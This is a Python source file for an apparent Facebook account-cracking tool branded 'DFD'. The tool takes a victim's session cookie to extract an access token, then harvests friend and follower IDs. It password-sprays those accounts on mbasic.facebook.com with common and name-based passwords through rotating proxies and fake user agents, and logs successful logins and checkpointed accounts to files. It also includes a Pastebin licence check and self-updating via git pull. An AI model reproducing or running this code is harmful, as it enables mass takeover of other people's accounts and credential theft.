### Import Module
import os
try:
    import requests
except ImportError:
    print('\n [×] requests module not installed!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Futures module not installed!...\n')
    os.system('pip install futures')

try:
    import bs4
except ImportError:
    print('\n [×] Bs4 module not installed!...\n')
    os.system('pip install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, threading, itertools,base64
from concurrent.futures import ThreadPoolExecutor as AzimVau
from datetime import datetime
from bs4 import BeautifulSoup
def xoshnaw():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "-".join(uuid)
  print("\x1b[37;1mYOUR ID : "+id)
  try:
    httpCaht = requests.get("https://pastebin.com/7MHy9yFk").text
    if id in httpCaht:
      print("\033[1;92mYOUR ID IS ACTIVE...!")
      msg = str(os.geteuid())
      time.sleep(0.3)
      pass
    else:
      print("\x1b[1;91mID ACTIVATE (telegram) INBOX  @sstt8")
      os.system('xdg-open https://t.me/@sstt8')
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
    if name == '__main__':
    	print(logo)
    	xoshnaw()
xoshnaw()
ct = datetime.now()
n = ct.month
bulan = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#useragent
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
os.system("pip install marshal")
try:
	prox= requests.get('https://github.com/DFD4x/TOOLxFB/blob/main/.DFD-IP.txt').text
	open('.DFD-IP.txt','w').write(prox)
except Exception as e:
	print('')
prox=open('.DFD-IP.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('DFD-MOBILE.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/DFD4x/TOOLxFB/blob/main/.DFD-MOBILE.txt').text
		ua=open('.DFD-MOBILE.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.DFD-MOBILE.txt','r').read().splitlines()
# INDICATION
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
# COLOUR 
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m'
m = '\x1b[1;91m'
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m'
u = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m'
p = '\x1b[0;34m' 
asu = random.choice([m,k,h,u,b])
# CONVERTER
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
def masud(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
import marshal
def banner():
	clear()
	print(f"""
______   ________  ______    
|_   _ `.|_   __  ||_   _ `.  
  | | `. \ | |_ \_|  | | `. \ 
  | |  | | |  _|     | |  | | 
 _| |_.' /_| |_     _| |_.' / 
|______.'|_____|   |______.'  
\033[1;37m\033[1;37m[ \033[1;37mTELEGRAM : @sstt8 \033[1;37m]
\033[1;31m\033[1;37m[ \033[1;31mGithub : LDVIP1 \033[1;37m]\033[1;37m\033[1;37m""")
# LOGIN
# new cooki 
def login():
 try:
  token = open('data/DFDtoken.txt','r').read()
  cok = open('data/DFDcookie.txt','r').read()
  tokenku.append(token)
  try:
   basariheker = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
   basganteng = json.loads(basariheker.text)['id']
   menu(basganteng)
  except KeyError:
   login_bas()
  except requests.exceptions.ConnectionError:
   print(f'[!] EROR  !{x}')
   exit()
 except IOError:
  login_bas()
def login_bas():
	try:
		os.system('clear')
		banner()
		ses = requests.Session()
		cookie=input(f'\n Cookies : ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		ken = open("data/DFDtoken.txt", "w").write(tok)
		cok = open("data/DFDcookie.txt", "w").write(cookie)
		print(f' Good python DFD.py ! ');time.sleep(1)
		os.system("python DFD.py")
		exit()
	except Exception as e:
		os.system('rm -rf data/DFDcookie.txt && rm -rf data/DFDtoken.txt')
		login_bas()
def menu(my_name):
	try:
		token = open('data/DFDtoken.txt','r').read()
		cok = open('data/DFDcookie.txt','r').read()
	except IOError:
		print('%s[%sNO%s]%s Cookies Expired '%(N,H,N,M))
		time.sleep(5)
		login_c()
	os.system('clear')
	banner()
		
	
	uuid = str(os.geteuid()) + str(os.getlogin())
	id = "".join(uuid)
	
	print("")
	print("")
	print('\033[1;31m%sDFD %s\033[1;31m01%s%s \033[1;31mCRACK PUBLIC %s%s%s'%(P,H,P,H,P,H,P))
	print('\033[1;31m%sDFD %s\033[1;31m02%s%s \033[1;31mCRACK PUBLIC (MULTI) %s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;37m%sDFD %s\033[1;31m03%s%s \033[1;31mCRACK FOLLOWERS %s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;37m%sDFD %s\033[1;31m04%s%s \033[1;31mCRACK FILE %s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;37m%sDFD %s\033[1;31m05%s%s \033[1;31mMY TELEGRAM %s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;34m%sDFD %s\033[1;34m00%s%s \033[1;34mEXIT %s%s%s'%(P,H,P,H,P,H,P))
	print("")
	DFD = input('%s%s%s%s\033[1;37m  CHOICE %s\033[1;37m : '%(N,H,N,H,M))
	if DFD in ['1','01']:
		dump_publik()
	elif DFD in ['2','02']:
		dump_massal()
	elif DFD in ['3','03']:
		follower()
	elif DFD in ['4','04']:
		TakeFile()
	elif DFD in ['5','05']:
		os.system("xdg-open  https://t.me/@sstt8")
		os.system("python DFD.py")
	elif DFD in ['',' ']:
		os.system("python DFD.py")
	elif DFD in ['0','00']:
		os.system('rm -rf data/DFDtoken.txt')
		os.system('rm -rf data/DFDcookie.txt')
		print(' [OK] LOGIN ACCOUNT ')
		exit()
# PUBLIC CRACK
def dump_publik():
	try:
		token = open('data/DFDtoken.txt','r').read()
		cok = open('data/DFDcookie.txt','r').read()
	except IOError:
		exit()
	win = ''
	win2 = mark(win, style='green')
	sol().print(win2)
	print("")
	pil = input(' ID FACEBOOK : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(' DFD-ID : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		li = ' '
		lo = mark(li, style='red')
		sol().print(lo, style='cyan')
		exit()
	except (KeyError,IOError):
		teks = ' NOT PUBLIC '
		teks2 = mark(teks, style='red')
		sol().print(teks2)
		exit()

def dump_massal():
	try:
		token = open('data/DFDtoken.txt','r').read()
		cok = open('data/DFDcookie.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(' FACEBOOK IDS [25] MAX ? : '))
	except ValueError:
		print('')
		exit()
	if jum<1 or jum>100:
		print('')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' FACEBOOK ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' IDS [25] MAX ')
			exit()
		except requests.exceptions.ConnectionError:
			li = '# '
			lo = mark(li, style='yellow')
			sol().print(lo, style='purple')
			exit()
			print("\n")
	tot = ' Facebook  %s ID '%(len(id))
	if len(id)==0:
		tot2 = mark( tot, style='purple')
	else:
		tot2 = mark(tot, style='yellow')
	sol().print(tot2)
	setting()

# FOLLOWER CRACK
def follower():
	try:
		token = open('data/DFDtoken.txt','r').read()
		cok = open('data/DFDcookie.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('  FACEBOOK ID : '))
	except ValueError:
		print('{k}  NOT PUBLIC ID ')
		time.sleep(3)
		follower()
	if jum<1:
		print(' Your limit error')
		time.sleep(3)
		follower()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1		
		kl = input(' FACEBOOK ID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			koh2 = ses.get('https://graph.facebook.com/'+userr+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
			for pi in koh2['subscribers']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
				except:continue
			print(' FACEBOOK Id :{h} '+str(len(id)))
			setting()
		except requests.exceptions.ConnectionError:
			print(' No  ')
			exit()
		except (KeyError,IOError):
			print('  ID NOT PUBLIC ')
			time.sleep(3)
			follower()

def TakeFile():
	try:
		token = open('data/DFDtoken.txt','r').read()
		cok = open('data/DFDcookie.txt','r').read()
	except IOError:
		exit()
	try:
		
		jum = input(' NAME.txt FILE : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print(' ID FILE :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print(' NO CONNECTION  ')
			exit()
	except (KeyError,IOError):
			print(' IS NOT FILE ')
			time.sleep(3)
			follower()
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	os.system('clear')
	banner()
	print(' FACEBOOK ID ALL : '+str(len(id)))
	print(' [1] CRACK ALL ')
	print("")

	if ['1','01']:
		os.system('1')
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\nDFD\n')
		exit()
	clear()
	banner()
	print('[01] WI-FI 2G 3G 4G 5G ')
	print("")
	method.append('mobile')
	clear()
	banner()
	print("""
	1 > password 1122334455 & 19901990 & 1234512345 & 12345678900 & 19951995 
	2 > password name
	3 > password 1996 - 2000
	4 > password 2000 - 2005 """)
	DFD = input(' CHOICE : ')
	if DFD in ['01','1']:
		passwrd1()
	if DFD in ['02','2']:
		passwrd2()
	if DFD in ['03','3']:
		passwrd3()
	if DFD in ['04','4']:
		passwrd4()
	if DFD in ['05','5']:
		passwrd5()
	if DFD in ['06','6']:
		passwrd()
	if DFD in ['07','7']:
		passwrd7()
	exit() 
# Method Main
def passwrd():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=50) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("1961996")
					pwv.append("19971997")
					pwv.append("19981998")
					pwv.append("19991999")
					pwv.append("20002000")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")
			else:
					pwv.append(nmf)
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("1961996")
					pwv.append("19971997")
					pwv.append("19981998")
					pwv.append("19991999")
					pwv.append("20002000")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd1():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("1961996")
					pwv.append("19971997")
					pwv.append("19981998")
					pwv.append("19991999")
					pwv.append("20002000")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")
			else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("1961996")
					pwv.append("19971997")
					pwv.append("19981998")
					pwv.append("19991999")
					pwv.append("20002000")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd2():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=20) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(nmf)
			else:
					pwv.append(nmf)
					pwv.append(nmf)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd3():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("1961996")
					pwv.append("19971997")
					pwv.append("19981998")
					pwv.append("19991999")
					pwv.append("20002000")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")
			else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("1961996")
					pwv.append("19971997")
					pwv.append("19981998")
					pwv.append("19991999")
					pwv.append("20002000")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd4():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("1961996")
					pwv.append("19971997")
					pwv.append("19981998")
					pwv.append("19991999")
					pwv.append("20002000")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")
			else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append("1961996")
					pwv.append("19971997")
					pwv.append("19981998")
					pwv.append("19991999")
					pwv.append("20002000")
					pwv.append("20012001")
					pwv.append("20022002")
					pwv.append("20032003")
					pwv.append("20042004")
					pwv.append("20052005")
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd5():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
			else:
					pwv.append(nmf)
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
					pwv.append(frs+'54321@#')


			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
def passwrd7():
	os.system('clear')
	banner()
	print("")
	with tred(max_workers=25) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(frs) == 3 or len(frs) == 4 or len(frs) == 5 or len(frs) == 6 or len(frs) == 7 or len(frs) == 8 or len(frs) == 9 or len(frs) == 10 or len(frs) == 11 or len(frs) == 12:
					pwv.append(nmf)
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")
			else:
					pwv.append(nmf)
					pwv.append("1122334455")
					pwv.append("1234512345")
					pwv.append("19901990")
					pwv.append("12345678900")
					pwv.append("19951995")

			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('')
	exit()
# Mobile 
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r DFD {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} : {P}\033[1;31mCP - {cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				
				print(f'\r{K}\n[ DFD-CP ]\n ID : {idf}\n PASSWORD : {pw}{N}')       
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n[ DFD-OK ]\n ID : {idf}\n PASSWORD : {pw}\n{N}')
				#DFD
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			elif "c_user" in po.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H}\n[ DFD-OK ][OK] ID : {idf}\n[OK]  PASSWORD : {pw}\n{ua}{N}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch DFD-IP.txt')
	except:pass
	try:os.system('touch DFD-IP.txt')
	except:pass
	login()